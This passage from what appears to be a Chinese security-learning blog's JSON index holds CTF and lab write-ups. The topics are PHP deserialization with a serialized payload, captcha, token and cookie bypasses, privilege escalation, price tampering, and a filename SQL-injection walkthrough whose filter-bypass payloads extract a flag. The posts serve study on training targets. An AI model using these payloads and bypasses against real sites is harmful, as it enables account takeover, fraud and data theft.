\"1\";\n        $this->content = \"\";\n        $this->process();\n    &#125;\n/*destruct()魔术方法会在传参是2的字符的时候，对传入的参数进行赋值，再执行process()函数；这里还需要注意一下op===\"2\"是强类型比较，而process()中op==\"2\"是弱类型比较，强类型比较既比较类型也比较值；而弱类型比较只比较值不比较类型。\n*/\n\nfunction process()函数：\npublic function process() &#123;\n        if($this->op == \"1\") &#123;\n            $this->write();\n        &#125; else if($this->op == \"2\") &#123;\n            $res = $this->read();\n            $this->output($res);\n        &#125; else &#123;\n            $this->output(\"Bad Hacker!\");\n        &#125;\n    &#125;\n//传入op==\"2\"使其执行read()函数\n\n为了绕过__destruct()函数中op的强类型比较，可以使op=2，使强类型返回false，使process()中的弱类型返回true。\n整体代码分析：\n代码中包含一个flag.php文件，有一个FileHandler的类，创建了三个变量，$op，$filename和$content；如果以GET方式使用str接收一个参数，将接收到的str值强制转换为string类型；使用is_valid()函数进行检查，执行for循环，若接收到的每一个字符的ASCII值&gt;=32&amp;&amp;&lt;=125则返回true；之后执行 $obj = unserialize($str);，此时整个程序已经结束，便会执行function __destruct()，若op===&quot;2&quot;则会执行op = &quot;1&quot;，当执行到$this-&gt;process();是便会执行function process()中的if($this-&gt;op == &quot;1&quot;) &#123;$this-&gt;write();&#125;，之后便会执行function write()，执行到这里并没有什么用，得不到flag；因此op==2使其执行function read()，此时只要将flag.php文件赋值给filename即可输出flag的值。\n其实就需要：传入一个序列化之后的类对象。\n0x02编写PHP脚本：\n&lt;?php\n\nclass FileHandler &#123;\n \n    public  $op = 2;\n    public  $filename = \"flag.php\";\n    public  $content = \"2\";        //因为destruct函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）\n&#125;\n \n$a = new FileHandler();\n$b = serialize($a);\necho $b;\n\n?>\n/*\n将op=2；filename=\"flag.php\";content任意值满足is_valid()即可；之后使用new将FileHandler()类实例化为对象，再使其序列化输出即可。\nnew：实例化对象；将类实例化成对象非常容易，只需要使用new关键字并在后面加上一个和类名同名的方法即可。当然如果在实例化对象时不需要为对象传递参数，在new关键字后面直接用类名称即可，不需要再加上括号。\n*/\n\n得到反序列化值：\nO:11:\"FileHandler\":3:&#123;s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";s:1:\"2\";&#125;\n\n参考文章：https://blog.csdn.net/xhy18634297976/article/details/122737825\n0x03传参\n\n查看源代码得到flag\n\n0x04 总结一道网鼎杯PHP反序列化题目，最重要的使代码审计，尤其还要注意protected在序列化之后会出现不可见字符，需要修改为public；像这样有类的反序列化需要将类实例化再序列化输出。\n如图：当使用protected时出现了不可见字符。\n\n","slug":"反序列化靶场","date":"2022-06-04T09:57:18.000Z","categories_index":"反序列化","tags_index":"反序列化","author_index":"Aurora"},{"id":"87006ba4a5e8f65e132df547ebdb643d","title":"反序列化-PHP","content":"0x00脑图\n\n0x01 原理序列化：将对象转化为字节序列\n反序列化：将字节序列转化为对象\n\n0x02 PHP反序列化未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。\nPHP序列化与反序列化函数：\nserialize()     &#x2F;&#x2F;将一个对象转换成一个字符串\nunserialize()   &#x2F;&#x2F;将字符串还原成一个对象\n0x03 触发漏洞触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：\n__construct()&#x2F;&#x2F;创建对象时触发\n\n__destruct() &#x2F;&#x2F;对象被销毁时触发\n\n__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发\n\n__callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发\n\n__get() &#x2F;&#x2F;用于从不可访问的属性读取数据\n\n__set() &#x2F;&#x2F;用于将数据写入不可访问的属性\n\n__isset() &#x2F;&#x2F;在不可访问的属性上调用 isset()或 empty()触发\n\n__unset() &#x2F;&#x2F;在不可访问的属性上使用 unset()时触发\n\n__invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发\n\n参考：https://www.cnblogs.com/20175211lyz/p/11403397.html\n0x04反序列化格式：将对象转化为字符串后的各属性图解\n\n0x05 PHP反序列化-无类问题-本地0x00写一个php序列化的脚本测试\n代码如下：\n&lt;?php\n$KEY='muyu123';\necho serialize($KEY);\n?>\n\n\n\n0x01利用https://www.dooccn.com/php/在线平台输出其序列化之后的内容\n\n可以看到输出序列化为：s字符型，长度为7个字符，变量名为muyu123。\n这个例子由于没有class，由此是无类的情况。\n0x02相反，进行反序列化输出，修改代码为：\n&lt;?php\n$KEY='s:7:\"muyu123\";';\necho unserialize($KEY);\n?>\n\n\n\n输出结果\n\n0x03对这部分代码块进行代码审计：\n包含一个flag.php文件，有一个KEY，以GET方式接收一个字符串，若接受的字符串反序列化之后&#x3D;KEY值，则输出flag.php文件。\n&lt;?php\nerror_reporting(0);\ninclude \"flag.php\";\n$KEY = \"muyu123\";\n$str = $_GET['str'];\nif (unserialize($str) === \"$KEY\")\n&#123;\necho \"$flag\";\n&#125;\nshow_source(__FILE__);\n?>\n\n\n\n0x04当KEY值不是字符串的时候，不会显示长度。\n\n0x06 PHP反序列化有类问题有类（class）代码代码块\n&lt;?php\n\tclass ABC&#123;\n    public $test;\n    function __construct()&#123;\n        $test = 1;\n        echo '调用了构造函数&lt;br>';\n    &#125;\n    function __destruct()&#123;\n        echo '调用了析构函数&lt;br>';\n    &#125;\n    function __wakeup()&#123;\n        echo '调用了苏醒函数&lt;br>';\n    &#125;\n&#125;\necho '创建对象a&lt;br>';\n$a = new ABC;\necho '序列化&lt;br>';\n$a_ser=serialize($a);\necho '反序列化&lt;br>';\n$a_unser=unserialize($a_ser);\necho '对象快要死了！';\n?>\n\n执行结果为：（只要有过Java和C++的功底都能理解）\n\n\n","slug":"反序列化-PHP","date":"2022-06-04T01:51:34.000Z","categories_index":"反序列化","tags_index":"反序列化","author_index":"Aurora"},{"id":"e9b18ef1b67c7f0e9290c6534e851593","title":"逻辑越权-验证码与Token及接口","content":"0x00脑图\n\n0x011、验证码安全\n分类: 图片，手机或邮箱，语音，视频，操作等原理: 验证生成或验证过程中的逻辑问题危害: 账户权限泄漏，短信轰炸，遍历，任意用户操作等漏洞: 客户端回显，验证码复用，验证码爆破，绕过等—验证码爆破：没有次数限制，验证码有效时间内不变\n—验证码识别：用工具识别验证码\n—复用：用上一次的验证码来绕过下一次的验证\n—回显：验证码在前端数据包显示\n2、token 安全\nToken的定义Token是服务端生成的一串字符串。当客户端第一次登录后，服务器生成一个Token并将此Token返回给客户端，Token可以代替用户名和密码作为身份的验证。\n每次客户端与服务器端通信，会得到新的Token基本上述同理，主要是验证中可存在绕过可继续后续测试token 爆破，token 客户端回显等—token 爆破—token后面会跟上一个字符串，如果知道规律可以进行爆破\n—token 客户端回显—token的数据会在前端数据包（request）里面显示\n—token固定—虽然有token，但是可以通过上一次的token操作下一次的数据包（表面上有，实际没有）\n3、验证码识别插件工具使用\ncaptcha-killerPkav_Http_FuzzreCAPTCHA 等\n4、接口安全问题\n调用，遍历，未授权，篡改等调用案例：短信轰炸遍历案列：UID 等遍历callback 回调 JSONP（使用callback相当于回调，需要取数据，可能会符合一些漏洞的条件，形成安全问题）\n0x02 Token1、token定义：\ntoken是服务端生成的一串字符串，以作客户端请求的一个令牌。当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。\n2、token的目的\n为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。\n3、token时效性\n\n极度敏感的信息，如钱或银行数据。不要在本地存放Token，存放在内存中，这样随着App关闭Token也就没有了\n对于敏感但跟钱无关，如教育App的学习进度，可以设置为一个月\n对于游戏、社交类App，时间可以更长些，半年或一年\n\n参考文章：https://blog.csdn.net/m0_37518413/article/details/103190957\n0x03 验证码识别插件及工具操作演示-实例0x00利用Pkav_Http_Fuzz工具识别验证码\n0x01后台登录框，显示有验证码\n\n0x02打开验证码地址\n\n###0x03\n抓取其数据包\n\n###0x04\n将数据包头部除去GET方式和Host以及Cookie字段，其他字段和验证码地址放入Pkav_Http_Fuzz识别工具识别（只能识别简单验证码）\n\n点击识别测试，可以看到识别到了验证码\n\n0x05 总结1、识别精度有限\n2、缺少接口，只能加载能够下载的识别库\n3、只能识别简单的验证码\n4、只能使用自带的发包器，不能结合到burpsuite\n0x04 利用BP插件captch-killer识别验证码0x00插件captch-killer详解文章：\nhttps://www.cnblogs.com/nul1/p/12071115.html\n0x01抓包，右键点击插件，如图：\n\n\n0x02点击获取验证码\n\n0x03验证码爆破内容看链接文章，由于接口付费，就不实操了。\n具体使用方法：\n使用burpsuite抓包，右键发送到“captcha-killer”“Send to captcha panel”\n接口URL填识别平台的接口地址\n开始识别\n爆破时使用该插件：“Attack type”选择“Pitchfork”，“Payload type”选择“Extension-generated”，“Extension payload generator”选择“captcha-killer”。不要用多线程。\n0x05 验证码绕过本地及远程验证-本地及实例0x00靶场：pikachu\n0x01 基于服务端的验证码绕过（on server）当随便输入用户名和密码并输入正确验证码后会提示账户不存在\n\n0x02当时输入正确账户输入错误验证码时会提示验证码错误\n\n这里表明是存在验证码检测的。\n0x03抓取正确验证码的数据包，返回结果没有报验证码错误\n\n\n0x04修改用户名和密码，观察返回包报错信息\n修改密码继续放包，可以看到没有报验证码错误信息，表明这里验证码还是有效的，可以进行验证码复用。\n（由于一般情况，验证码只能使用一次，使用之后第二次复用就会报错）\n\n0x05这里就可以复用验证码进行爆破。\n设置爆破字段\n\n设置好爆破字典\n\n开始爆破。\n可以看到长度不同的表示爆破成功，账户密码为admin，123456。\n\n\n0x06进行一下代码审计，查看为什么能够验证码复用。\n\n从代码中可以看到验证码在验证完成后没有销毁session导致验证重复使用；session在登录之后是会存在一段时间，而在这段时间没有一直可以利用session值。\n0x06 基于客户端的验证码绕过（on client）0x00前端验证源代码\n\n0x01有些前端验证看不到源代码，是由于加载js文件实现前端验证。\n将验证文件写入新建的1.js中，在主页面文件中加载1.js文件，刷新页面擦查看数据包\n\n\n0x02随便输入验证码直接抓包，可以看到前端验证并没有执行，数据包直接发送到服务端给出了回复包，成功绕过。\n\n0x06 Token客户端回显绕过登录爆破演示-实例0x00 Token简介1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。\n2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。\n3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。\n什么是token（例如：在下订单的时候，使用token会防止重复下订单）\n0x01随意输入账号密码抓包，带有token值\n\n0x02重新抓包查看token\n\n两次token值不同；每一次登录时候就会产生一个token值。\n0x03放包查看回复包的token值\n\n这里抓取的数据包中的token值就是回复包中的token值。\n0x04利用BP爆破\n\n这里线程必须是1，不能多线程。\n\n设置重定向Always\n\n 设置grep extract匹配用法，点击添加，查找到token值选择，点击ok。\n（截取回显数据包某个字段，使用正则表达式去匹配这个值。）\n\npayload2中设置token值使用正则表达式匹配。\n\n0x05爆破结果显示token值是上一次回复包的token值。\n先截取回复包中的token值，然后再匹配截取到的token值去提交数据包。\n\n0x07 Callback自定义返回调用安全-漏洞测试-实例0x00\n\n\n\n\n\n\n\n\n 什么是callback\n—一般而言，函数的形参是指由外往内向函数体传递变量的入口，但此处加了callback后则完全相反，它是指函数体在完成某种使命后调用外部函数的出口！这时候应该明白什么叫”回调”了吧，也就是回头调用外部函数的意思。 \n0x01这里callback后的数据代表微信登陆，然后将微信登陆数据返回给callback\ncallback参数可以更改，可以和跨站漏洞结合\n-在网页源代码搜索传递的参数，如果存在，意味着URL传递的参数会在网页的前端回显，那么，也意味着可以构造XSS漏洞（测试有没有过滤，完不完整） \n\n0x08 上述在实战中如何做到漏洞发现-bp功能点原理：逻辑漏洞挖功能点和参数值（关键的参数：id，callback，filename，uid等等）\n抓包发送到爬虫（bp右键点击tools中的find references）\n搜索关键字（使用 discover content模块过滤搜索内容，相当于帮你筛选）\n工作原理相当于集成扫描工具，搜集更多的信息。\n","slug":"逻辑越权-验证码与Token及接口","date":"2022-06-02T08:18:09.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"539bd4c95e28f22aa63a4256033042d5","title":"逻辑越权-找回机制与接口爆破","content":"0x001.找回重置机制\n客户端回显：验证码在客户端的浏览器或数据包中可以看到\nResponse状态值：页面通过该值返回输入的验证码的对错，可以修改数据包中的值，有回复的状态值如0&#x2F;1，我们可以更改状态值来实现绕过\n验证码爆破：如果验证码范围不大，验证码有效时间足够，没有次数限制，则可以尝试\n找回流程绕过：发送验证码-验证-重置密码，绕过验证码验证，直接请求下一步（找回成功后会跳转到另外一个页面，先通过一个正常用户去获取跳转的URL和数据包，再换一个用户去访问第三步（跳过验证 ））\n2.接口调用乱用\n短信轰炸，来电轰炸(呼死你原理，有些网站有发送数据包的功能，截获网站验证码的数据包，然后利用软件或者程序去进行批量测试，即调用别人网站的接口来实现短信轰炸)\n0x01 绑定手机验证码逻辑-Rep 状态值篡改-实例0x00靶场：夜神模拟器\n攻击机：windows10\n0x01先在模拟器中修改代理和端口，在BP中设置代理及监听其端口\n\n0x02点击福利期货app我的主页-&#x3D;-个人信息—修改密码\n\n\n0x03在修改密码中任意输入短信验证码进行抓包，得到验证码错误的回复包\n\n放包之后可以看到短信验证码不正确\n\n0x04正常获取验证码，抓取正确验证码的回复包\n\n可以观察到正确验证码的回复包是和错误验证码的回复包是有区别的\n\n0x05再任意输入验证码抓包，利用BP通过右键do intercept&gt;response to the request，截获返回数据包，放包，将错误的回显改为正确的回显放包\n\n\n错误回显包，更改正确回显包\n\n\n0x06直接跳转修改密码页面\n\n0x07 总结重置密码的步骤：1.发送验证码2.验证3.重置密码\n流程绕过原理：1直接—&gt;到3，跳过了验证\n测试：将3个数据包都抓到，在1数据包到2数据包的时候，用工具拦截，直接加载第三个界面 。\n类似的网站类的验证码情况大致相同；\n主要注意一下：是本地回显验证还是服务端回显验证。\n0x02 验证码爆破原理分析：\n抓取数据包，将code发送爆破（如果是数字，就可以直接爆破，如果是英文，就要用字典）\n前提条件：1.验证码的存活时间2.验证码的输入次数限制3.有些短信验证码输入一次就改一次（就没法爆破）\n如果是直接显示的图片验证码（这里要识别验证码（插件自动识别））（如果是拖动或者\n识别的验证码就更加复杂）\n（靶场搭建了两天，总是环境有问题，都不能进行注册，之后遇到再补充吧）\n","slug":"逻辑越权-找回机制与接口爆破","date":"2022-06-01T10:04:03.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"329a24a72a2314bc7146a2672d8bedf5","title":"逻辑越权靶场--后台及订单支付类","content":"0x00 后台登陆账号密码爆破测试0x00靶场：ZBlog博客网站后台密码爆破\n攻击机：windows10\n0x01利用admin，admin抓取登录时的数据包：\n\n\n可以看到密码是经过加密的，类型应该是md5。\n0x02尝试利用BP爆破模块进行密码的暴力破解；\n由于密码是经过加密的，所以这里爆破的时候需要选择Rule：MD5对需要爆破的密码进行加密。\n\n\n0x03payload长度不一样并且状态码是302，基本可以确定这就是密码，把并且页面已经跳转。\n\n查看payload2得到后台密码：0192023a7bbd73250516f069df18b500\n经过MD5解密：\n\n使用正确密码成功登录后台：\n\n0x04 总结这里需要注意的主要是爆破密码时是否经过加密，有些网站后台密码是不经过加密，因此需要认真观察数据包的每个字段。\n0x01 Cookie脆弱点验证修改测试0x00靶场：熊海cms内容管理系统\n攻击机：windows10\n0x01观察一下首页只有几个功能项，随便点击几个观察一下：\n\n###0x02\n通过点击列表，下载，联系这几个功能项，观察url可以发现它是通过r进行传参跳转页面面：\n\n\n\n0x03查看一下源代码进行一下代码审计：\n网站目录如下：\n这里index传参r,判断传递的参数file是为空还是为index，如果是index，就执行file文件下的传递参数的文件。这里只有等于index路径才能跳转。\n如果r&#x3D;index,在跳转管理员执行&#x2F;files&#x2F;index.php文件，文件开头包含了验证，防止用户直接登录URL路径进入管理员后台\n因为访问的index.php，在审计file文件夹中index.php文件,看到的是执行了以下两个文件，对这两文件进行查看。\n\nfile文件夹下的index文件中又请求了checklogin.php文件，用来检查登录情况，防止用户直接通过url进去网站后台。\n\n当登录时候后台会检测uesr字段，如果useer字段为空，直接跳转到login.php，若user字段不为空，直接无需账号密码通过后台地址登录后台。\n\n0x04这里第一次查看登录信息请求包是没有cookie信息的：\n\n当正常登录之后会有cookie信息：\n而网站后台主页地址是：\nhttp:&#x2F;&#x2F;192.168.216.128:8065&#x2F;admin&#x2F;?r&#x3D;index\n\n返回登录界面直接访问后台地址抓包：\n此时有cookie数据（users&#x3D;admin是正常登录之后遗留下来的）。\n根据代码审计user值只要不为空即可直接登录后台，表明user值随便填，将user值修改为1进行放包：\n\n成功登录后台。\n0x05 总结因为这个网站后台的首页的是index通过传参的方式验证登录。登录之前会对cookie进行验证验证由于方式很过于简单只是对cookie是否为空进行判断，也就是说传递的值不是为空程序就认为你是登录了，因此这就形成了弱cookie登录的漏洞。\n 实战条件下，如何去分析漏洞：\n—没有源码，去找cookie脆弱点十分困难的\n—如果有特殊值，如user&#x3D;admin，可以尝试修改，看是不是可以登录到其它用户，如user&#x3D;text\n—可以根据这个漏洞，去搜索采用熊海CMS的网站是否存在cookie脆弱的漏洞\n0x02 某建站西永商品支付逻辑测试-价格，商品0x00靶场：大米cms\n攻击机：windows10\n0x01 修改产品打开主页购买大米测试产品，直接购买10个，抓取数据包：\n\n\n再购买大米手机cms，抓取数据包：\n\n\n0x02分析数据包可知，只有id和name字段值不同，那这里可以使用低价的id和name去替换高价的id和name达到以低价购买高价的目的：\n先购买10个大米cms\n\n替换字段\n\n\n可以看到开始时候购买的是大米cms总计54000，修改数据包之后变为大米测试产品，实现以低价购买高价的目的。\n0x03 修改价格观察数据包发现price字段就是产品的价格，修改价格为1：\n\n这里可以看到价格更改成功，订单总价变化。\n","slug":"逻辑越权靶场-后台及订单支付类","date":"2022-06-01T01:40:29.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"6ff7edeb448384a80b03b049d4e9dda5","title":"逻辑越权--登录脆弱及支付篡改","content":"0x00 登录应用功能点安全问题检测功能点，检测，危害，修复方案等\n检测：存在登录功能点的地方\n危害：不用账号密码直接登录\n登陆点越权方法：\n1.登录点暴力破解：如果数据包传输的账号密码没有加密或加密方式已知，可以尝试暴力破解2.HTTP&#x2F;HTTPS 传输：https会采用加密传输，http不一定3.Cookie 脆弱点验证：代码审计，看看cookie有无可操作的值，调整那些跟你登陆页面有关的项，看是否会影响功能。如修改“user”的值。4.Session 固定点测试5.验证密文比对安全测试\n0x01 数据篡改安全问题商品购买流程：选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付\n常见篡改参数：商品编号 ID，购买价格，购买数量，支付方式，订单号，支付状态等\n常见修改方法：替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等\n参考文章：https://www.secpulse.com/archives/67080.html\n","slug":"逻辑越权-登录脆弱及支付篡改","date":"2022-05-31T13:00:46.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"1851c5af9327b469d7ad45778d027d01","title":"逻辑越权靶场","content":"0x00靶机：pikachu逻辑越权，墨者靶场-身份认证失效漏洞实战\n攻击机：windows10\n0x01 水平越权###0x00\n首先以普通用户登录：\n\n\n0x01抓包查看数据包信息：\n将username字段中的kobe修改为lucy：\n\n可以看到用户切换成功，实现了水平越权。\n0x02 垂直越权所谓垂直越权就是低权限访问高权限进行一系列操作。\n###0x00\n同样，先登录，但这里首先需要以管理员身份登录，之后再使用普通用户登录：\n###0x01\n这里admin用户可以进行增加修改删除用户的操作，这里随便创建一个用户并抓取数据包：\n0x02切换pikachu用户，只有读权限，没有其他权限：\n0x03将抓到的管理员创建用户的数据包修改为用户名为asdf，密码7989之后，将浏览器中的cookie替换repeater中的cookie（图中为替换之后的cookie），再将数据包发送出去。\n\n\n0x04刷新页面可以看到多了一个用户asdf，以低权限进行了高权限操作，实现了垂直越权。\n\n这个操作的条件必须要获取管理员创建用户的数据包。\npikachu的垂直越权漏洞通过游客的cookie进行创建了新用户，这是由于源文件中的adminedit.php文件（用于管理员添加用户的文件）只验证了是否登录，没有验证级别，导致存在了越权问题，最终普通用户也可以进行创建用户。\n墨者靶场—身份认证失效漏洞实战0x00打开靶场，看到有个测试账户，而且题目也说了下级代理想要查看上级代理，必定要进行越权访问的。\n\n\n0x01抓包分析：\n\n\n这里存在两个数据包，需要把第一个登录之后抓到的包放出去得到第二个card_id字段的包，这里card_id字段其实就是每个人的编号，那找到相应的编号即可，使用爆破模块进行爆破。\n0x02爆破模块爆破：\n长度不一样的表示由用户，但需要找到对应的用户，而登录页面看到有马春生图片，打开查看器查找相关信息，可以找到其编号：\n0x03将登录的数据包card_id值修改为20128880316进行登录：\n得到用户名和密码，密码值加密，看其特征应该是md5，直接解密：\n\n0x04输入账号密码进行登录：\n得到key值。\n","slug":"逻辑越权靶场","date":"2022-05-30T14:40:09.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"e12149c3e216e6cbcac496259253a06d","title":"逻辑越权--水平垂直越权","content":"0x00脑图：\n\n0x01 漏洞产生原因通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。\n\n隐藏URL\n\n直接对象引用\n\n多阶段功能\n\n静态文件\n\n平台配置错误\n\n\n0x02 分类1、水平越权\n水平越权是指攻击者尝试访问与他具有相同权限的用户资源。比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。以下是常出现的水平越权的几种场景：\n基于用户身份ID在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。基于对象ID在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。基于文件名在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。\n2、垂直越权\n垂直越权是指低权限用户尝试访问高权限用户的资源。由于后台应用没有做权限控制，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要猜测其他管理页面的URL或者敏感的参数信息，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。主要有以下两种场景：\n未认证账号，访问无需认证后能访问该功能不具备某个功能权限的账户，认证后能成功访问该功能\n垂直越权条件：\n需要获取管理员的数据包：\n例：添加用户\n需要管理员添加用户的数据包\n如何获取数据包：\na.普通用户前端有操作界面可以抓取数据包\nb.通过网站源码本地搭建自己去模拟抓取数据包\nc.盲猜\n3、未授权访问\n通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。(有些操作要管理员才行) \n0x03图解：\n\n","slug":"逻辑越权-水平垂直越权","date":"2022-05-30T08:55:04.000Z","categories_index":"逻辑越权","tags_index":"逻辑越权","author_index":"Aurora"},{"id":"006aa54f10dc84a237bfb17ee3048459","title":"攻防世界：upload","content":"前言攻防世界一道Web进阶题，题目是upload，最后做了半天使用upload的方式一点用没有，看了几篇博主的帖子，发现是SQL注入，文件名的SQL注入。\n\n\n\n0x01上传2.jpg文件会返回文件名，上传php文件返回：不正确的拓展名；开始以为有检测，尝试了各种upload的绕过方式，都不行，都会返回不正确的拓展名。\n\n\n0x02看了几篇帖子才知道是基于文件名的SQL注入：\n因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。\n任何与数据库发生连接交互的地方都可能存在SQL注入！\n0x03涉及几个函数：\nconv(N,from_base,to_base) ：conv函数接收一个数字，进行进制转换N是指函数接受的数值，from_base是指这个数值原来的进制，to_base是指需要转化的进制。\nSubstr()第一种：SBUSTR(str,pos);就是从pos开始的位置，一直截取到最后。第二种：SUBSTR(str,pos,len);len指截取长度这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始\nHex()：这个函数就是把里面的参数转化成16进制。\n0x04插入SQl语句：\n\n可以看到select被过滤了，尝试绕过：\n这里使用双写绕过成功\n\n在后续测试过程中from也被过滤，最后也是用双写绕过。\n在这里其实就可以知道存在sql注入了；\n0x05尝试去验证sql注入：\n1&#39;+(selselectect database())+&#39;.jpg\n\n可以看到sql语句被执行了，但是只输出一个1，后续查询的结果没有被输出。(可能数据被过滤掉了)\n\n\n0x06尝试将查询结果改为16进制输出\n构造payload ：\n1&#39;+(selselectect hex(database()))+&#39;.jpg\n\n\n将数据库名字转换16进制+1输出得到7765626（7765625+1），将这个数字16进制解码得到web\n\n这里有个坑,  插入数据库文件名中如果包括SQL语句，在返回信息时，服务器将对字母进行截断（某些特殊字符也会截断或过滤） 尝试用10进制表示 conv函数(src,from_base,to_base) src是要转换的数据, from_base是原进制, to_base是目标进制.\n使用CONV是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。\n构造payload：\n&#39;+(selselectect conv(hex(database()),16,10))+&#39;.jpg\n\n\n返回结果使用了科学计数法，这里就需要截断数据了。\n 构造payload：\n&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg \n\n(经过测试发现长度最大为12,超过12 就会返回科学计数法表示)\n\n有返回值：131277325825392\n尝试截取13试试：\n可以看到返回的还是科学计数法，验证最大为12。\n将十进制131277325825392转换为16进制7765625f7570，16进制解码得到部分数据库名：\n\n\n由此可以得出7765626并不是完整的16进制编码的数据库名，在返回信息时，服务器应该是对其进行了截断。\n由于上述返回的是科学计数法，对其进行了截断处理，所以再将后面的结果将其查出：\n构造payload：（从13开始）\n&#39;+(selselectect conv(substr(hex(database()),13,12),16,10))+&#39;.jpg\n\n\n得到1819238756，解码得到：---&gt;6c6f6164---&gt;load\n最后将其拼接得到完整的数据名：web_upload\n0x07查表：\n&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),1,12),16,10))+&#39;.jpg\n\n\n返回：114784820031327—&gt;68656c6c6f5f（16）—&gt;hello_\n&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),13,12),16,10))+&#39;.jpg\n\n返回：112615676665705—&gt;666c61675f69（16）—&gt;flag_i\n&#39;+(seleselectct+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema&#x3D;&#39;web_upload&#39; limit 1,1)),25,12),16,10))+&#39;.jpg\n\n返回：126853610566245—&gt;735f68657265（16）—&gt;s_here\n表名拼接为：hello_flag_is_here\n##0x08\n查字段：\n&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;.jpg\n\n\n\n返回：115858377367398—&gt;695f616d5f66（16）—&gt;i_am_f\n&#39;+(seleselectct+conv(substr(hex((selselectect column_name frfromom information_schema.columns where table_name&#x3D;&#39;hello_flag_is_here&#39; limit 0,1)),13,12),16,10))+&#39;.jpg\n\n返回：7102823—&gt;6c6167（16）—&gt;lag\n字段拼接为：i_am_flag\n##0x09\n查内容：\n&#39;+(seleselectct+conv(substr(hex(selselectect i_am_flag frfromom hello_flag_is_here limit 0,1),1,12),16,10))+&#39;.jpg\n\n\n\n返回：36427215695199—&gt;21215f406d5f（16）—&gt;!!_@m_\n&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#39;.jpg\n\n返回：92806431727430—&gt;54682e655f46（16）—&gt;Th.e_F\n&#39;+(seleselectct+conv(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#39;.jpg\n\n返回：560750951—&gt;216c6167（16）—&gt;!lag\n拼接flag为：!!_@m_Th.e_F!lag\n参考文章：\nhttps://blog.csdn.net/qq_44065556/article/details/120449847\nhttps://blog.csdn.net/mochu7777777/article/details/104724247\n0x10（总结）这个题拿到以后首先肯定认为是文件上传的题目，但由于上传文件不会返回文件路径，这是和一般上传题目不同的地方；其次，每次上传之后返回的是文件名，这不由的会想到sql注入的特征：报错回显，正确返回内容。这里最主要就是要想到：因为回显的只是文件名，然后它存入数据库的也可能是文件名，既然连接了数据库就可能存在注入漏洞。然后就能想到可能是文件名sql注入。任何与数据库发生连接交互的地方都可能存在SQL注入！有文件名回显,这说明文件已经被传到了数据库中,浏览器又从数据库中读取了上传的文件,那么这个过程就有可能触发sql注入。\n题中还有一个是：使用conv函数是因为题目过滤了回显有字母的情况，如果出现了字母则后面的内容就不显示，所以需要将16进制的内容转成10进制。\n","slug":"攻防世界：upload","date":"2022-05-11T08:43:06.000Z","categories_index":"SQL注入","tags_index":"SQL注入,文件上传","author_index":"Aurora"},{"id":"c8ef155fa65ec1b0a64a3057d6715027","title":"攻防世界-web-command_execution","content":"前言一道攻防世界的命令执行题目。\n0x00\n根据提示RCE无WAF，直接打开题目。\n0x01\n##0x02\n老规矩，先看看是何服务器\n\n\nlinux服务器。\n0x03先ping 